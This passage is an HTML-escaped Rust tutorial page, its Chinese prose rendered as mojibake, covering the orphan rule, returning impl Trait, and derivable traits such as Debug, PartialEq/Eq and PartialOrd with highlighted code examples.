&lt;/div>&lt;p>ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œ &lt;code>AddAssign&lt;/code> æ˜¯æ ‡å‡†åº“ä¸­å®šä¹‰çš„ trait, å±äºå¤–éƒ¨ç±»å‹ï¼Œè€Œ &lt;code>T&lt;/code> æ˜¯ä¸€ä¸ªæ³›å‹ç±»å‹ï¼Œæ„å‘³ç€ &lt;code>T&lt;/code> å¯ä»¥æ˜¯ä»»æ„å®ç°äº† &lt;code>Document&lt;/code> trait çš„ç±»å‹ï¼ˆåŒ…æ‹¬å®šä¹‰åœ¨å…¶ä»– crate ä¸­çš„å¤–éƒ¨ç±»å‹ï¼‰ï¼Œå› æ­¤ï¼Œè¿åäº†å­¤å„¿è§„åˆ™çš„å®šä¹‰ã€‚&lt;/p>
&lt;h3 id="è¿”å›å®ç°äº†ç‰¹å®š-trait-çš„ç±»å‹">è¿”å›å®ç°äº†ç‰¹å®š Trait çš„ç±»å‹&lt;/h3>
&lt;p>åœ¨è¿”å›ç±»å‹ä¸­æŒ‡å®š trait ç±»å‹ï¼Œå¯ä»¥å¯¹è¿”å›ç±»å‹è¿›è¡Œçº¦æŸï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">returns_summarizable&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Summary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Tweet&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">username&lt;/span>: &lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;horse_ebooks&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">content&lt;/span>: &lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;of course, as you probably already know, people&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">reply&lt;/span>: &lt;span class="nc">false&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">retweet&lt;/span>: &lt;span class="nc">false&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç”±äºæ³›å‹ç±»å‹æ˜¯ç¼–è¯‘æ—¶ç¡®å®šçš„ï¼Œå› æ­¤ä¸Šè¿°è¿™ç§æ–¹å¼æœ‰ä¸ªé™åˆ¶ï¼Œå°±æ˜¯ä¸èƒ½åœ¨å‡½æ•°ä¸­çš„åˆ†æ”¯ä»£ç é‡Œï¼Œåˆ†åˆ«è¿”å›ä¸åŒçš„å…·ä½“ç±»å‹ã€‚&lt;/p>
&lt;p>å¦‚æœéœ€è¦æ”¯æŒè¿”å›å¤šä¸ªä¸åŒçš„å®ç°äº†æŸä¸ª trait çš„å…·ä½“ç±»å‹ï¼Œéœ€è¦ä½¿ç”¨ &lt;em>trait object&lt;/em>
(&lt;code>Box&amp;lt;dyn T&amp;gt;&lt;/code>, å‚è€ƒ
&lt;a href="https://doc.rust-lang.org/book/ch17-02-trait-objects.html">Using Trait Objects
That Allow for Values of Different Types&lt;/a>) ã€‚&lt;/p>
&lt;h2 id="å¯æ´¾ç”Ÿçš„ç‰¹å¾--derivable-traits">å¯æ´¾ç”Ÿçš„ç‰¹å¾ (Derivable Traits)&lt;/h2>
&lt;p>&lt;em>Derivable trait&lt;/em> æŒ‡å¯ä»¥é€šè¿‡ç¼–è¯‘å™¨è‡ªåŠ¨å®ç°çš„ traitã€‚å¯¹äºæŸäº›æ ‡å‡†åº“ä¸­å®šä¹‰çš„ traitï¼Œ
Rust å…è®¸ä½ åœ¨è‡ªå®šä¹‰ç±»å‹ä¸Šé€šè¿‡ç®€å•åœ°æ·»åŠ ä¸€ä¸ªå±æ€§ï¼ˆattributeï¼‰æ¥è‡ªåŠ¨å®ç°è¿™äº› traitï¼Œè€Œä¸éœ€è¦æ‰‹åŠ¨ç¼–å†™å®ç°ä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸º &amp;ldquo;æ´¾ç”Ÿ&amp;rdquo;ï¼ˆderivingï¼‰ã€‚&lt;/p>
&lt;p>ä½¿ç”¨å¯æ´¾ç”Ÿ trait çš„ä¸»è¦ä¼˜ç‚¹æ˜¯å®ƒå‡å°‘äº†æ ·æ¿ä»£ç çš„æ•°é‡ï¼Œä½¿å¾—ç±»å‹å®šä¹‰æ›´åŠ ç®€æ´ã€‚è¿™å¯¹äºæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§éå¸¸æœ‰å¸®åŠ©ã€‚&lt;/p>
&lt;p>é™¤äº†æ ‡å‡†åº“æä¾›çš„ derivable traits å¤–ï¼Œç¬¬ä¸‰æ–¹åº“ä¹Ÿå¯ä»¥ä¸ºè‡ªå·±çš„ traits å®ç° &lt;code>derive&lt;/code>,
å› æ­¤ï¼Œè¿™ä¸ª derivable traits åˆ—è¡¨æ˜¯å¼€æ”¾çš„ã€‚&lt;/p>
&lt;p>ä¸‹é¢åˆ—å‡ºäº†ç›®å‰ä¸ºæ­¢æ ‡å‡†åº“æä¾›çš„æ‰€æœ‰ derivable traits, å¹¶å¯¹å…¶ä½¿ç”¨è¦ç‚¹è¿›è¡Œç®€å•è¯´æ˜ã€‚&lt;/p>
&lt;h3 id="debug">&lt;code>Debug&lt;/code>&lt;/h3>
&lt;p>ç”¨äºæ”¯æŒå­—ç¬¦ä¸²æ ¼å¼åŒ–ä¸­çš„ &lt;code>{:?}&lt;/code> å ä½ç¬¦ï¼Œä¸»è¦ç”¨äº debug æ‰“å°ã€‚&lt;/p>
&lt;p>ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>assert_eq!&lt;/code> å®è¦æ±‚å…¶å‚æ•°å®ç° &lt;code>Debug&lt;/code> traitã€‚&lt;/li>
&lt;/ul>
&lt;p>ç”¨æ³•æ¼”ç¤ºï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// è‡ªåŠ¨æ´¾ç”Ÿ Debug trait çš„å®ç°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Position&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Position&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>: &lt;span class="mi">20&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">Position { x: 10, y: 20 }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šé¢æ˜¯ç¨‹åºçš„è¾“å‡ºç»“æœã€‚&lt;/p>
&lt;h3 id="partialeq-eq">&lt;code>PartialEq&lt;/code>, &lt;code>Eq&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>ç”¨äºæ”¯æŒ &lt;code>==&lt;/code> å’Œ &lt;code>!=&lt;/code> æ“ä½œç¬¦ã€‚&lt;/li>
&lt;li>&lt;code>Eq&lt;/code> æ²¡æœ‰æ–¹æ³•å®šä¹‰ï¼Œåªæ˜¯ä¸€ä¸ªæŒ‡ç¤ºï¼Œè¡¨æ˜é’ˆå¯¹è¯¥ç±»å‹çš„æ¯ä¸ªå€¼ï¼Œè¯¥å€¼éƒ½ç­‰äºå…¶è‡ªèº«ã€‚&lt;/li>
&lt;li>&lt;code>Eq&lt;/code> trait åªèƒ½åº”ç”¨äºå®ç°äº† &lt;code>PartialEq&lt;/code> çš„ç±»å‹ã€‚&lt;/li>
&lt;/ul>
&lt;p>ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>assert_eq!&lt;/code> å®è¦æ±‚å…¶å‚æ•°å®ç° &lt;code>PartialEq&lt;/code> traitã€‚&lt;/li>
&lt;li>&lt;code>HashMap&amp;lt;K, V&amp;gt;&lt;/code> è¦æ±‚ key å€¼å®ç° &lt;code>Eq&lt;/code> traitã€‚&lt;/li>
&lt;/ul>
&lt;p>ç”¨æ³•æ¼”ç¤ºï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(PartialEq, Eq, Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Rect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">left&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">right&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">top&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bottom&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Rect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">left&lt;/span>: &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">right&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">top&lt;/span>: &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bottom&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Rect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">left&lt;/span>: &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">right&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">top&lt;/span>: &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bottom&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="fm">dbg!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r2&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">[src/main.rs:25] r1 == r2 = true
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="partialord-ord">&lt;code>PartialOrd&lt;/code>, &lt;code>Ord&lt;/code>&lt;/h3>
&lt;p>&lt;code>PartialOrd&lt;/code> å’Œ &lt;code>Ord&lt;/code> ç”¨äºæ”¯æŒç±»å‹çš„æ¯”è¾ƒæ“ä½œï¼Œå¯ç”¨äº &lt;code>&amp;lt;&lt;/code>, &lt;code>&amp;gt;&lt;/code>, &lt;code>&amp;lt;=&lt;/code>, &lt;code>&amp;gt;=&lt;/code> è¿™å‡ ä¸ªæ“ä½œç¬¦ã€‚äºŒè€…ä¹‹é—´æœ‰å¦‚ä¸‹åŒºåˆ«ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>PartialOrd&lt;/code> åªèƒ½åº”ç”¨åœ¨å®ç°äº† &lt;code>PartialEq&lt;/code> çš„ç±»å‹ä¸Š&lt;/li>
&lt;li>&lt;code>Ord&lt;/code> åªèƒ½åº”ç”¨åœ¨å®ç°äº† &lt;code>Eq&lt;/code> (ä»è€Œä¹Ÿéœ€è¦å®ç° &lt;code>PartialEq&lt;/code> ) çš„ç±»å‹ä¸Š&lt;/li>
&lt;li>&lt;code>PartialOrd&lt;/code> è¿”å›çš„æ˜¯ &lt;code>Option&amp;lt;Ordering&amp;gt;&lt;/code> ç±»å‹ï¼Œè€Œ &lt;code>Ord&lt;/code> è¿”å›çš„æ˜¯ &lt;code>Ordering&lt;/code> ç±»å‹&lt;/li>
&lt;/ul>
&lt;h4 id="partialord-æ”¯æŒçš„å¯æ¯”è¾ƒæ€§æ˜¯å¯é€‰çš„">&lt;code>PartialOrd&lt;/code> æ”¯æŒçš„å¯æ¯”è¾ƒæ€§æ˜¯å¯é€‰çš„&lt;/h4>
&lt;p>æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œ &lt;code>PartialOrd&lt;/code> ä¸­å®šä¹‰çš„æ¯”è¾ƒæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª &lt;code>Option&amp;lt;Ordering&amp;gt;&lt;/code> ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥è¡¨è¾¾æŸäº›å€¼ä¹‹é—´ä¸å¯æ¯”è¾ƒçš„è¯­æ„ã€‚&lt;/p>
&lt;p>ä¸ºäº†æ¼”ç¤ºè¿™ä¸ªæ¦‚å¿µï¼Œä¸‹é¢æœæ’°äº†ä¸€ä¸ªä¾‹å­ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(PartialEq)]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// è‡ªåŠ¨æ´¾ç”Ÿ PartialEq trait çš„å®ç°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">enum&lt;/span> &lt;span class="nc">E&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">u16&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Dog&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">u16&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">E&lt;/span>::&lt;span class="p">{&lt;/span>&lt;span class="n">Dog&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Man&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">PartialOrd&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">partial_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">other&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">Self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">cmp&lt;/span>::&lt;span class="n">Ordering&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Dog&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">me&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Dog&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// Dog åªå’Œ Dog ç›¸æ¯”è¾ƒ
